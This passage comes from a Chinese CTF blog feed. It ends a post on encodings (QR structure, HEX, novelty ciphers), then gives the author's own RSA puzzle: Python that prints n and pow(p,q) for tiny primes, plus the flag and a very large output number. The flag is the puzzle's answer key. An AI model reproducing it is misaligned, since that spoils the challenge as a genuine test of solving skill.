<li><p>QR码还可以支持所有类型的数据（如：数字、英文字母、日文字母、汉字、符号、二进制、控制码等）。一个QR码最多可以处理7089字(仅用数字时)的巨大信息量。</p>
</li>
<li><p>在小空间内打印：QR码使用纵向和横向两个方向处理数据，如果是相同的信息量，QR码所占空间为条形码的十分之一左右。(还支持Micro QR码，可以在更小空间内处理数据。)</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208143030240.png" alt="还能更省"></p>
</li>
</ol>
<ul>
<li><p>QR码的基本结构</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208143204928.png" alt="QR码"></p>
<p>格式信息：纠错等级<br>版本信息：即二维码的规格，QR码符号共有40种规格的矩阵</p>
</li>
</ul>
<p>然后看到师傅用的一个github里的项目，<a href="https://github.com/Sssddcc/qrazybox">手撕二维码</a>的，感觉挺有意思</p>
<h2 id="HEX编码"><a href="#HEX编码" class="headerlink" title="HEX编码"></a>HEX编码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">字符串：                    4XWi11</span><br><span class="line">ASCII码：                  [<span class="number">52</span>, <span class="number">88</span>, <span class="number">87</span>, <span class="number">105</span>, <span class="number">49</span>, <span class="number">49</span>]</span><br><span class="line">二进制码：                  00110100 01011000 01010111 01101001 00110001 00110001</span><br><span class="line">重新分组：                  0011 0100 0101 <span class="number">1000</span> 0101 0111 0110 <span class="number">1001</span> 0011 0001 0011 0001</span><br><span class="line">高位补零后的二进制码：      00000011 00000100 00000101 00001000 00000101 00000111 00000110 00001001 00000011 00000001 00000011 00000001</span><br><span class="line">十六进制码：                       <span class="number">3</span>        <span class="number">4</span>        <span class="number">5</span>        <span class="number">8</span>        <span class="number">5</span>        <span class="number">7</span>        <span class="number">6</span>        <span class="number">9</span>        <span class="number">3</span>        <span class="number">1</span>        <span class="number">3</span>        <span class="number">1</span></span><br><span class="line">Hex码：                    <span class="number">345857693131</span></span><br></pre></td></tr></table></figure>

<p>当然HEX有多种形式，数字是一样的，注意不要不认识了</p>
<h1 id="稀奇古怪的编码"><a href="#稀奇古怪的编码" class="headerlink" title="稀奇古怪的编码"></a>稀奇古怪的编码</h1><p>有他们各自独特的算法吧，可能是别人的一些项目，可以信息搜索到在线解密，重要的是注意积累吧。</p>
<h2 id="社会主义核心价值观编码"><a href="#社会主义核心价值观编码" class="headerlink" title="社会主义核心价值观编码"></a>社会主义核心价值观编码</h2><h2 id="与佛论禅"><a href="#与佛论禅" class="headerlink" title="与佛论禅"></a>与佛论禅</h2><h2 id="与熊论道"><a href="#与熊论道" class="headerlink" title="与熊论道"></a>与熊论道</h2><p>以上就是师傅课堂里涉及到的全部编码，这里无脑地全部摘下来，但正如博客中间提到的，重要的是自己遇到和积累的。所以想要写一篇博客持续更新，记录我在打ctf路上，遇到的那些编码以及加密。</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>如果早知道p也会被q侵</title>
    <url>/posts/57d3f300/</url>
    <content><![CDATA[<p>20210917</p>
<p>献丑了，出道题。之前那道题p异或q的魔改，要不是有数据，也可以认为是p的q次方，但这个数会很大，所以尽显理论上讨论，在小数据范围内尝试</p>
<span id="more"></span>

<h1 id="如果早知道p也会被q侵"><a href="#如果早知道p也会被q侵" class="headerlink" title="如果早知道p也会被q侵"></a>如果早知道p也会被q侵</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">16</span>)</span><br><span class="line">q = getPrime(<span class="number">16</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + md5(<span class="built_in">str</span>(uuid4()).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(p, q))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>我知道有yafu，如果突然yafu一夜之间突然不见了？主要是熟悉下公式</p>
<blockquote>
<p>flag{fcb87fecbf8625f06726e544f08a2a15}</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">3462301697</span></span><br><span class="line">x = <span class="number">109997462839385950936509710856953573628663214799321409130957519917896383885371885444170001731351867617982895112797184938698079233604654785231021637286825417772458207317449717265307024743908067574845818493024561770576559079775598720599182208557142640156141305483894025297375759912101087785048554130699378260795247897991874865392094621482016589355494638389005994361909761159081414501721989830145097558545761612307272536583922691895574936498288327369553840926606268527687339529924611115485348643982473098286625142742398393231386045646639879626415917053692381655430957778839955082910056249344485497256775524085177802712245833779702392093897749189779535347664562586154309776328055156609133561898132672857101665938210643769997666555014255568480212796214389850512656788481854550339143242806722087877924088581117580400615218736156638681516847574577130463678045138901902337383512624135216412928162093319091597510568281569367451923081619598713773887838953369865691565636409451897908708014750509542356046710782056663772605998546313045368035557250399242776225547898062408431414894909860267823648313837269633879906061506837667887493258518335506432264522979118073110233935946001694741269824805890925090288090285841329605107865673931120285734169034802432883354554447925228567893412096624333843120819802630623375389457811911646936529713441801831786625113223939933042155385732707848120785078557918123739361417873153403489663892025060009117382890376636175487459516179360461758728750295602006342396230310205509057830417044555712121060790581983688231457863876699110089114422300109631686785634086458021255687106599716932975734224094916599886262910624820424319017215017513770315290141698412288008078037477485992176353051964010049861541099207431671989269037795026433219878908909956124071013310948532525994411715748772495909160712806723440225092334438124030112761021894332227538537928745007655594734627475160890951127695136903723522941458905211187251459896589431368880574259737489732872115182760382480957965659790609019336834211140554819900965962962354252133955258640649189475838846378774228790389234557889341680675597738578999584773617270534078911011803728674059073373407605111725839648039611221310257208069691485236770145220692579739006884079424766884132397279315021763880948328277322557779046737904103837587383436914105916527831068373815200986572025437876649197926520092047937291867497141139841986835373543001633399408810554731905853450950776126865750699461530108094664784846777330300364247444478161057266797301875530417131974084490629012144018657719586156676465050794249915112737271160765301785546541304630451457376303895038680832050444748780741376942538257395052365815322859671328832643376329066612281488746847942171876232955566041934122337881083056176194857562500828626292424048615679737633393059312900533303345423959050643728001989794492412386949521784049889087114639473479308071891724666936538066686445262993637958132172335111420594113257849878316457138989041278269287742617412508063635321052825781548411355180201224466877916869504792207506972373730707885872415211035550474174239883425715614673307250611575249456717472874372658581913005464818516193802584936851054917961703345321950647523981243719749678398690506824992937287222343487410646493446324185803381305654114649553990144718349048862111765485997587673415186465316734759969022350638696963823063965151672534474913849455332529704219210170500871437903548395386708116045790237835951780974687785355704151199684558146291009404865176165507671623212437535112447220281253236908958828384655590793318620314908971700927587918784915968710094870143868298907065331187378497608056605743512274787145767581947469623222459511781369798937882939704933912788918618788391407865066033532089368188449080617496269135436475515345348251918620355818722715274936702752322055298872329007253114316631353088329102015029321340269674256629249183599062628468373954109063320659654980032024434007486544485300403642592625315527738644591311746689288612740017447562703332701141434272760750080085034303137825659139219551228782123861488580466119878533545757823736189949246527648124703446377995466748474517930331596556000290384687185121774233009858930942293208497010270999266450181353631685452903077632604982056764992885735143549836605174643980413347843485020721115981456352720523968807905683973925023238226451708995072526032406041566514481812941522475735677160191084872157049577934243358268708033793585806542741050018776955387234441338735430780647758132269756636295133368580981394168538787553283236901441735149178496851536943594094375105312385715620410398850860095732130499664266830648986328532024760525557790952927260495437885994371992404191159234403353798388626710100773774658175433547700178614040440676101701067395936700396760876557304092468913133251844673075349960685500694935231717532847154738229990243641899104234174759705394045332831684409117885496978973704432623073183828811249176956192746031174212794289817072355446622807984101805847888383481806482600696655804055137054895667052260667585850724312452735792757982570162113329654393723040757274718312814040772700409824682069159662140822634551277859856091619009852423437298667119344521946493287383103044471535836920553990985854099089585640945576558464142512811149494432071774284611580850662852416186533251241296561363418697172283789228520183929905281275992261046431799575915003338670951572142264997516160722219221135455996157891818535031005262572457808514844017585967029951270055543401337389136263828367647566222136433266909537431323260881705677784771253073416300738570832266116251066328066121503950748912299890208328790948373006486702273454102437928844498067810173821595406522272350550914935072876607542003218733781936735310136161689746534320191040256438558233408136859348427403182659904761322750036511101563001244986764700365801115639155733556984252886815879023007806908364676425599286111252207318631321656542821313636913788794686724845470023238826232176374396515575481348255932781687859665116066590008242538684277551917928635738115213843482527324347782693373063762882574069040294675901899788746069689339219616443714514117331487974715226921445095940874681166491862374727504353098001929649486598469320319412599099601172568763744637081194083853452930690256902474494690775138765506594214047838373234969066630638541581266689781981146030977153928426757127292069997630779266244942108726171773584388621482071550829213070561815076403845812078528765739253855886353639475560655673927339698771303261034144904657610689215518815859374157598003596815370135981823958167369781245632891493090151316099063307191673483904560552126870859993971204829241420827338521150480629272856993923265738736341063487444824057937344218332946028568025062682336435711656472412903264247593387722009781477265619645370960564320925703251884717224992329928929334011561931760374665439950411712021578154697965894737078618173618647005663190930656489178948439522529082295687941500299707951383748826690445327069220806922700763941010359349196174953258154574754850093441762895650665596827260942788066002067695233106203185648051418042513247302421542592530060281606630514199013406639442589650477218243532875328280063632165265116551837320213070795744714829093587453919067628079755507626016225471740183573434629805008920847898317462551329936744689848568563916982955089864913169277105042055754594033535791715716522848526734926813082524027860416681280648690706397978741293613806464848499890108377352797838259087661914475100813097260573211809287047112011107861242700344993299880744859479507033462054748489954369617462600581006151708962828816022455705004462240032792382095143388614060944446790696397344326268167093378069435272135129252099301614970495218115905072866190142323025773487046707414338968498819319887275069466141995163560382601771583883814683670222835171733414973738750592793814912070932378459929721050335751105373915577359043055587627596494919737601684508374108491006603351034019462509332471216144799747246444916292038908304404061060752266949940938528863000820636965408631109546551553195944756220993875959972513162253701465691712520217521289806842167382568861713233009692388490006823385394175089170382788760135940110438198223883321990804925470963919870590950499805337847446765220086908298961976656966610600822364998990028883342112209530995423847009818765274024632967573230994352230019961902797386910655990472517088203661697874935304873436587207881241681945707094171645085925123062272418781938204761710684515280893407050360631754336063133802252255296800950845490796765184414854255982914784024726341920603069816160802358240526110628451516420230323238525894136091313134304534559144349401882868415034993140175562169482127960446712471731737755671613411008750268052778905536559525175274025547540057610863888588132161931525289387218272576327082420641702625179353109810970022891117388189007452067920834555050912648961257966401745396655080398226003986282191910116592982644420056903529066632831528776725775807469543283976130977910314185198267100053474834366305786871117884753555710986598886807686852052594864705332570710919844186975913460817049317145383499009553662208544743930397127442098353368252229643186707456059391447568026403091334043173325656199812881934496638591741479264697833568725290515324667931786296965161586721711202452469884020271179851292530977133543116846530631177138002215219042848221577614979279179151635613308628565977480792269987321930450321806894376279149661293898726046526795064570660266367162740611626636942426666440275087898712777562134763083467349233735945357160203902826636252858057688148561643167299302409578045150143179986924828598950128979763306314536149165301305424662456690274827903372124755807565559017958095112768238457770001435754272802194780632934104284232724080055831654214758790560778107445385605411236832735917934793123631112478467577406713522495886692755005837206995951690884716730456039004153521841487694309944217442241680958138576650299554743802655823446484868709967127197219977009187471303543452233124481809050085796289750793625275019921940799452473715551094434836845577182319495092147616416328845947760112871376539705345061763804458470213080784187044308098529032122083960087590225640080597902940518990968964180202151644458421577052456071101538907459701790020264282080786655582929095972426342381186078097493566537273692635236883856530146605255056724611451189280963246146876513113292013217067255299131382476500522951144971617525304561747353712082837588918758277849216448277443919024713125353722913203923532899894359061423078176762560847318912402768892032764325057148589326885652549375133632539243035430004208107754344422537021796399201407584105872147896870768154857556556522478611038841246801717275843203793862090142299284735737167178741758391697824736798419140773423834085647913213977558615026443764661574438831856541117542595938901318056802403572051675531575128218135521947521143180235568355530559792664715512078670214207912409367803657626742859598837156833142561218302214122472702534272020518479351601647156460189052653080079287220373660175580865957178623943078373360523593434330467746840157511928632736103687857305575018969733337418028881574573925109584370695484899173346031847753697689050390306418428573676266895998490806180459851700199673630397915974120364741121858551013827042929473457056534186594610847664485173069079419330404651392562242293389817040130419184752165664540338749406895983642048086577496899655943242604161164953572862693263171011535136636457692836643098851614474769205916895072932325599161420865391767444104157265558041185883477331739846987606265660124787760388378734505731336023647125936608456967018697607068592843619494091933455009397753401979111376159855165416859333747612300543543889428228662387625549589779562352353614211822701911455565733622811110183940625121181614687021616393828357735856380181847185036270742933483592659687641160639892874355697361399706854761015738870761104939463947057347267773269516222063978696281680836970389265925206504551719443672677331465435192739778954769002004034196299113347554016051807781596144694127382960791322463879583370791079886828447024645118954496069659675234255379823183135349705543774853847990305408058206966120988272025233199199607241121235776494656007628578091821766526124077150085007296399504381215294643797207227043954452314557407655955762169028624057087792000112393115499733882398776090090170531981357528078505989111236594957015047142442236415824271203566028891606536486180265235500250109420656739444322931269398143943427601838246631975604483361666812601560573982798233484662839038992308339151273689265948776440391032146111551083714588033417615419812488946787275034632389024104988115143209801884686440894603690763197341706651913763238232639063630636844978875522347223641657546855487686634632777131378317252011542992693499631078114648000031115050684068952593846706708794830081129411247021742149219975439907417822868444281235749598211537731921520483887997610530430741107136650256378963973602527054952066024270038149914879041048515028693305523157610772404746532336191950376969648995729849052162290944074445122041779888069734258503313242914334399096467484145210477057375908041363512051759009788603860788559588863100953247993423621266068296969037032380448903062259591602259461302689226357875143689065463764682797900005770627342106813938715153596312092094722834453407567146057121876246447911290808266962747444131369438673502507052745962793009044842245453583563358051450772844739119298391133846271519173386444394713026801464480533665889229808108983952404040959407956424720669800453854576041224341423841963872691852943582045824602341227072386973961421595056146270157593171140743046456422953422802359136095396349161234682831606724294910379635579156182463521364064871492963073203427326299576178646530587052401066053445140899470629907644858397356905505950227662204060852182987076199730051545019549999591596898645824577352929962477938269385158979392212943349640055516668171162906665325244891692472247657352351207911639708753120906848194115328719402286749393229028249866125241933567151010072650351125251704821421928959954712500452779858438756644558924569090949267584820347116704882441105170171542190298915212220140996852260533708584402672681869929696525173312204461435768927706941006561558119855906770034653398783192654095752528420019101754151593584767482589542636775785413057110527178796857556444564773736193115969080825678308355723255788877172433836965691088138444235933737168728187343535051924742482039632675684240220832621062645968316141351369061917304186132437633061432217949428464619479135847443185353698119474074490689676500325935721999124095667998947352418623233627486401343470158052622134989986437567777929214352772542744296442434151354965915695122297772792837574424617979594299109829035282353138676944391046473810628748189718142792550019986442938943811583424620488422296575368045488995145359168778213326049446596513620878332957806857789325867774165803026925755435916745445117913985080102874339515508218241673746117817855817106189906348739637931660046584994052359721517681683806772973474748271261076396868836883728863996187954180862331840438525570423726140755788322953333421810927451079775213251964485897549307512942433289720194419969199561188757710617335608590053614084972478280750097385350584573116826292514828647367122854377704960406885589723571455975460777799493804998429797831916187176050926639673762084583581283461447481148792322612954792584687323464098971914704911841432078481684497652735949835920829633358320606296900894459831421895900184199001876790672879684862509368750801783379479403827416844352982641942433370849572827805586906997801844285422821224602526505966458354882019524236425572366751306465987289565854954546797852457764773290645302133493607980281851373138630927107724643035047117243038868059355331557540037976065576789865169555570222833534729413713782915564561002406145181729225147152902627041926290400887731341307845647157880830883121021266849967386552773736728303865616954029621615845413327203867951956620998645333708186078790578605687227801191189271653705564703074448083609685991163906324916280728470129802271822937502069358231860339483202943063686961390745947000807863722322464109782052488472571534299622096310493595152590248920348414484338180384125619440243952510847465474143987821822936118384890955747443397199791237097558556428361999745994760022227642514588883710931043772077373282287851541854378946672431237445158167499567263600564244505757320830168520927595924618429326984122408465982623576424899917724935793951698653951337467222369003093752164023059962371224991984796874130715089700878681395157492233837833795868910191536175479039181105423189102486730354521648703121872510856619255298956405675624078983689570557164611400069521703269683841559786592552269057694120216924104558820947638133802169970073918473003948688600069224342667770662605071483060560694392988855477221739486881843035987921873134652039652479203452801395863348943109325919117165849070710086419398697655666335241685920990928081164337986431117799615952103772039697706852896700904295104810305286921021867479647674721117729538947135408359861222131909058024017452414280326461001401490809046867858866122216890441325262263866638554843885532444974154420114265463192233496033823213748721801614543598916189605728188868916645574765102416527807929471764502957858442474214091490475119797724486062072008374183730522945936556257923964085621100653233188374872904455646861911097447120832434518782155415962484088902221190083658356957717734700953764296044613184337456847074591195844455894313069597891582895413213575423385760907101734915807545488633094831048990866428373770509632627940781829922961812596696172716429151335053593106101015438689964619034044655241661762945075310176320133146661276108695539287161200450856575539387643680813810009759571873535716594979505698901729999377671249791229842032964316055091910404505998707251438606373390734287039067974044306388718907789198080446193532258891998417415243430129443092422355740840866826071101467861858188695936430406567264128233286539441105287701521557613832072927473627778218834900095996144265326832993377088759260845928866539003976223762667296395355857168135012370935061199876970684633971761412352142869557970969496466778812063451964057418808158184991276256609241314247751335824789521779146366428080441651984096867952629872290349410892585128765108722473212141524646708985096727092344990581691328465171210436380755435662677105446677104929429304173830032372339154034881629319261406538192123096252235304972032745703551814132517947604498266115064200631922785297063243270972592238035948914210631284206147423928158394234042246880552713874424385294954977688292855503713598573469041772267348572479320522517797042756487106335441651002929524939214182040772711765075631030098661845949481639125397756830497945971758445618794287366608486512918527705900423548929243780983504892001195838720121596773049039657868330693519958240383272070741545499460233474385828367079718197685223507795539863003311210638008437163201523461751951217588439193056238066697307978624163691732166566008057745071660433114097049112798204740578380866138344852413934738745991258171410159950407487499562220901360461197547725151806303839131766882603491986221733383120199912293003291216901397096036830715747768052336855918264880296456419952773237966900686095507154091156037191276330754104781036314685416476993142288179441522049158906844970167807164737700618925165259228766572184453503793162528072211870264182196558065572659265864439221653427335549607490113671821757213357037494793652404327418742926620634098518772231791585964271364103304268092933387815212662697678411653652358079262467651507008679575224768360727446401654012546286391100262870296354189677607408614937518228339019866703818359017267609312396649212235198017672817475867869290328354370805957277310167007328331647746119002933310137862228991284898909860226275859753327526222443471412153103750815575226984089989354099508236289538357061723606264627921222324722909156391186800000415050048547392261084619798980404342578175533353359638196778576580530221528070323358502955666704079409301961083230974936141019020658619766494362666171213055485980969659105157740160490745394857087230477276969996262218473264483927154600372743996088494984283048486003290730777965429492264223286386524018027500690279066314383527266912084938560670283893740264386941386950926501499825988529616193069464609462691050570057719702742964803830240681326048114314431653107701006750448048291496722151336022825184545889979130627099961778228481287856512668567294542040669433491621793199086651324663873913599033210985791557976730119229795041134094788413360125414631276772539416824174169160317944295260223604203369428629512233946380192130428933093760280030312416869966214720261903289363370102497834862142134622843140372365651818687856747555091596333076202471579636916890474843464681552684941292321926905394594287890422571847266105982336255410240714711963061818442152088960810905350727517871350833041614439624310547783837916116092391776331314848230181192765022611227983820971946238380718592544951298042632483147554690780351547087526971340648574316037331555891702377466317252114058697299114604352428094227803712630649892654702109400394016137854026984144341597800626021821199567852730812681588406427624113420473911124362293340844948432763775924149999541784828878558842546627220908261572480821008662597574402923728935329639763751901077593045195340247789774271303432136180715990250043526777558237253868662259939093064271151305474642289536508843497773701363852095154572841957931502216598144721433669068978326524601917925901969612014865520914104849345261210662028031652972582810935001489119609553774146757245254853502257414158767316413110761539726402932419056287418655500579860452355688900284523330028997636516104444010164163797127147251913141721272288240182516506384080372236323805596077667392662496450299617990430792184906156089120516359306665240489305471708115776343492309657064859883048983693922708413519438250100945258573840209784652975627313872053019598406481136867624332924306424366719200097571493369511211667684492515126691391009585345089407217250575305335143856488871630341730391345943627285716967983097169752688737284357372937885506787960312225143914356905039125453178349858508859321114240871008092037359671330388665408169119208344836745532969349043523858148586714456190019239424172317023280262837746807139864753449681013996986079753056747380810023922177183252111890290295700249568846080287088302126756829547794912320697964489753834937705889513805228840683052234875842090747887979142627410640699585904897582122573313966692572121881171754380541977622431380155754156014688550420906449860384023122017133360756395800412090404849807209782333023159041759846096502613730386609472808269681259502053803924494015842982243984365069354942641931729152642576251067064462617689570748805406153612575217739007503286327717835222441328384385877373349127168570023004961771924059789709891469919570931050535983979713266581121729767164639646457413884642605101487875443112177536785021184548497713893098014553514389350142046903094599182703906413657524558315557411319296097814540533076961617119311203342301427659323779415062777314015968440115310382119779133692813334679021944122076589025563271857644516770360743709640133750106629534442328996149817908111189539271166961162019414932645273569203797906611080255928013453531034008737855681540151678227582439606576148729815626229854909065432607618078263703697051867889875761862004301653761517551732688367368999804486534351890552827603767800055342469368099243244727864512969575949530138891004145531057359222187169373888553657880441318293600735078256423949491179395037498469290714480597743437374509381496746268232817654546500216070075654081435840996681407795909923336481530333568885394884006832733071073938611557755229171264462504864925412838055590178207841427208085039216337496216449002967674356652923016352363197910178943749193942160856372376032948124343581982314654208107227182883055343060095551612360491288200876520908605419762128091614651452997398239833944037890226798922976082538509963506122838478929508756611358150931143873334980320128276836372139569709291369644084212078450659421782134118384565761811638230781087145011803274354953593578428875444352568352170954630790694784644985765712402704015392163496784301705472929741553717608837969507876766166935251655872003809212989265617218581001554149786722696279950430510182076551812834616338979028509484857265285695237841217849720726501270867879594363208672278150536382132510328930419844683054113093880568770193013550162442747481739454783850180564925802515388863553744594033261147430986882934308598304766396721684015839005661191271553605269638341091987911759518656709543042211371084278426499866538608066229128743974376677502767464304071179259549037562714797132290617282900986659679882453856213684727089404446260299000187132279520236951331304976809519968619715600183187872264309330662034850052820767630746118074571215746330300368872754045682286349375451126749756172901003477465655826459461931760478821676903179854391276954389930880122122220755778236853528959095963902033129067461805131576156446589638901241508024925864148762632131950700070934058080656521357179932675989898367470501688859566612745993274288107811037457182698464809539665163596849067101288467852235878235611011910532917969103014431780767795022390048120818178071661146838284235545873298607715600303584506426491642921631870575343731035410432956905773516853238383624843934955654639673682774523342145147203507175507300264380660827179718400874777628283063812752606951427351870860321906455132397378626234108525144406242723043679655781026274749236314938473065397333893848165381859906241404806383901229286660047279681366513904852013859998731458560299375076026614367510059472810464104203471088598374732504932731814475825362855981786427227041716400750363231419385196352655408549463591478727645710023454211092860696165722452133303139195450365298040508604088542071550833679401135105533378181796512070272704546994046095542924369176335807071257506024241686696693874669996055425920680870870437567842300533848165257961353301886818463710360211275610342482386026861130303517136911346170471792823775846789056756461670710829303332642604333755466970969829340430594962636719134196596526566413306279906760567619916528565757696722818763035260470858943157377783884913261342599402090901907020514306933302996769947567957229598027993786378310329038296523155162866135835826164498215215610724665474524777068295058701121877783875981658721238355922124635867563766547261991805084668199412182668977589091895912960305594151699859123883348686622048380479732622808994063781922445551859032472753943887620126461144306733298582239734357356518587260934774108960277211987154085627145714310106354847467336749779875634005792342725260216286178573048900554976050565283159750955728006213341739223299386711839581916281631880455409511166185284121226413295683445909076555258532568396018313392622572740592262911564814057808404582438896108063636381838882733461087973571277594001291160573547802704428438148508457315033251652217492629961133331572720841309748103406329135542289554060863948706978497918345128044690630527713315693797347864218819726998775481864290446100026031839167572081497373962570205383522242647632214648008941276847797659547768889605110305330710373759531921796890546548402328605015647280420684963869660911897234745267200832709381240859116306007654314202922882952788515157432437903547537603242928346660565395036007090435928083555956939593228926604038115461727568973833112963261257854018602174757066123074549144204890058131740443644526021528692499302603038190719433937517301104743524424133586563381781504365934288365494909971658243279658971637928620915751424827047504888933101422603585203670573322202183812758340991433895081270284681753552970841034671625730359346457644420853999218499186197134041402836878197596279364301439183987573996324994480900652309811067784246908680443231315999446473973260692444122104350405670674962033561432512207295383548540122918913831426079114729001033482413222675843557796333323984957042174839191437772269998910660581891761861953313289577892952847093317134882588927644259753087373147111578085147208134219323947002314381297222153809274918592045766728359792710710027924577529820324343365859677946787096725757266880197725893288482217465398407381652315708740406820591622913937430158539242494677180792020247606152717451172842243076270345962827584258358940475149331659223688003210834082222419524679757214117112208017877839501540913568690314226983122777084075709927962312441226465503960723450197699844942371041452594171314315827934269654913101906596291982730640768807053186695410743461972631344075394030143040971166136972123906443134976295401944014085584553233757868119072594805551556149560582003266855098584749589825414061900602485952557188161975559251043687920801509053603711904242789147865198867240416505970630677082947431899480688020414621709280838519771820863038123639349344221052713126411034671530159560622514579456510491655106379206814009924349984955195492417155672563051776912040833794598404303083288730808837985019818348698637209524740630934483055729002873424752472562663922943346975236035349448953619184630342575514992855536192156229093524939546020130415244279654943858551541921459246503230902565006545987811847822522194025875823720951092883567315818111265913481774153216070043027180416737903039253304923163872537588794928106889157938532166846934510785455736736977382235255421055305864594423154144480861554687991939071350796924618222093316780976481679297330398564694216530530987842222744954184033143465832201630016293048739701316104649363681514190087830512179404477919053386620184511989937788669748957342546976287880168922186283962985213765864587640488409216124759982565167376793420439526026863251192282418917298938247322715759109648457101414763123198314760389999992834512553996571539976526259297344509551474311217175467343535352421601449415047907842236247376359049483610038403529142677392990357873303663980865949078994610582616511089984168855063061321816964149966389648501244292789445636712300403752401219122727201260513995917155628828594700727698255654671349276170651897498859146722746604080105854432128279657992657387998166915081442505459564303413814072752122152938251170239050163202615068273945257271982985762572846005342499544560788912886298549302477884141651136709757025008967846525732605624333225075947306568671050283947249462613902991045721758136738411997935422700794467935867943497204684892760912592565233966404856821732779045268862208777491789087604012761761755255865547233001448224938909223721680560452988407152251849463331680813911364735766107501463920955519025344994758608860365739717307713885225173925719519597562493935491118458176968578409660464008456123221204532410908933664457070867802254272636890545086774474687519848551054174917257363258039278937532219984945228149339338834347074167490848426603113984523519254949773877884561657902569897200543459857465158347072745320218191871774187715034288534292962812358604621563709145577281837078441709107617298018465479583044520077585123241325244256203936026259500230028633165600770112344582141437129575976723200109466016938196125510854498449577547618843480986116075423145437213620413398163867012369553912384314044799260636864555115223696880601100549479443397983695681237043857853398072854564221872494430468887601438279183231610192547290371416390631212522141810571212836110518654631693581115781545829609753767762082770928883047409662994007877325551248536420394302461485279146400931841797470854878941839084484951947650998001197770656655414014339554402018307490287615005720181049672478135777996798942428107401774903480281182175162378811521400009453887855424943831735718110362461222573959906657006471517278001870710591955958306537905958359258342687158833482660016562231687753459368302501850681015697976114542402396979568920211709086557160713853571834569066182878092177471303096222918400715611378888847824453417615205570024722908188155433467916348076129238672719319638271089308743327767221674589845580156267435462436086115720464551755669733780280250248138393981598933167029815628220064704601529771813294961810313278030513275262230512125946117464359495605551249082677357190464643964263764146931617662895024451516862012191132447559041138884629114455568689920876542442301253406800428448077597816394238132173013455448388466967092890070348467103584368340977178224821868464266650963893112234219677073379989234000111966597286662873591270378829365847062110004915994107560047146926147794753970453306378955693515944117084994394231488841152988144318591524557813316825264575189910390031956664003080120603330029337269849073698381820838990500945870122888886695607910559021129275971985475499159305165410276947370797400294286195181540315157053879692685059011551128750119725205308176361187806544935399132187920732388934409633259596825866769100156897353004436957901813037729100545652668571866934968629543323267848803957639187233165198667017248345663963197236685822380810966536716056944010239750926498807023494861341142475181193563311072871346907712291663853635032716384918608537197582258654948500227673777233782122540382028008491886465921298369117557300695153615686331866821533172419096352497584012083622304100833453255360097460547342682667762648120565125786755483207677219457656947574431416138849614548757492160872937290291631718001560077858860063951732764152637733077550638718369864040878470542029542805774038117303316311448093842950471448616389359229293867614805310303429807053180168119285520436394381898101397816972501366513018456314919732989446390835530718889395043380729727963015049828605303011398902076168967366691085876868010586569113645587158965052993387210279330878741423881640110757817103267597183383089352387404480367803109116297614999907573095290876110021240888755478021131290971259487070353959221748686271307758509462008555752753703090575316326732275271255990547622845199929272918898742538155641947917112389754756074002710978054996741920777826783015241833560169044488360040537412882620721782411585150519289412786509522972393114002495294688734919335503732000176560776702662872406002820294614938749499659308136544562810604042454752482517287635303193359696905422150713976746665840679980879413840232492471518269167202920142297688048367861380879413936613499980240788417567504836835283117062537585886729742349918496741864727997402927773266741260635016617112684120820874909233599132656705216008147113745979106387606518897006339134369438265581604899224036430860430544305380870580310860335049031962561057968387090752352940651474589528198407465851459801738846334049298599915383779366476414868302004473140435883006679445488201379220383856456240640612503485063055149052396343016378747054044781204562511446879080645089196520634678034170742981058162978062767342771724053489309728454107034883118459853651549713375019393744670993584442658162974508289440586547402916041610956828615064994585264529154667481726037741157182509737870536461531713946580405732247144816529844553747393388122487397191151348136413574205642719688361361200795495367259988227162205097159769021190441555947048174389211401316948677940927724145496664614647232624776142264464282822163045816831232618652200512375664525693345472772732167949190087337774585716401102885468002370956015670754346423496257148867712090170112464557040237259093765868470971083578782643978044041944294540786934131942176672954054791527285025069320075264208088727849570857742402464696455379551990409200941478247623353901913362645278084257366430137572130125622070712655400922831588126693566236287965491681932944763104294211319128282390049818253953869872654799844455860055523640237296831735167761250447873950999714029842856899440477203726340335990238785153814203511109388850502823851062438850840403831111621608613582662720509421717738003544850066590768957939913488250944766993406760534071938378757601792553056709095725122813280509812902054393858583566886884305891666282788033956167012602646885218299674685109722765380409329578260550866456597177562787837884070675003401527317134275500492222125059745662666995601487031043810152022020305406516890513493685298470859683415236001365546525628330782140061467253647690667831070586210158706682920781817847654824473727637398577004308643799278048200047830623484154438647026320611228615973988476802598636359822818031161933512800974409450839972869280722485744376874324497677345980138541098174700683735521799133938883272649220389351358192736808721814087693815580377634783478546403115987208305841465775881580883469847004206141109736940883870855867006097987327669162625392091942654440162057298462298116823156568770231918282768844645119941891225174504238358267091370455140547903893648728593571042929623040686292154886665377266297258423405832170259699037027093448451083126611282413742447185232529038477109517213677604883998577148796587303468595536004269214403253089200765679525216790000127451390962596180697404350778000202156544399239915765297592416705383895488687773048764342745234281696755779174685925259271620783356768703183633857526322221855949552708570070566263443304158944999600485626826433585825541303966474530053653278762852248522923009324303938228533380197437207168765367080804263041566205787106244509520224253048603302941119177009964608286957400619799671559211323472692763680715523564599742983217626811902556318166964274918183581357294026626403235912128990391505305327581198359725712845225900241217056109262535936310138247449527960646482903671933499658320519880833036420977499559186624585346289406981926754200331495556603129713709018150726495830084428043035513677277546652881540845668070830223259372930260034152586505597975599433330830753551172179494761583837890423043228816404894473837273207081083230465408683506289704360356573554395952136580603347541794637394286185278515580125409043085597391865504630234155984799220227403159561580069940783722832696145183160921149271602229483472668697483575341841328198861452742068490947894882307682380893095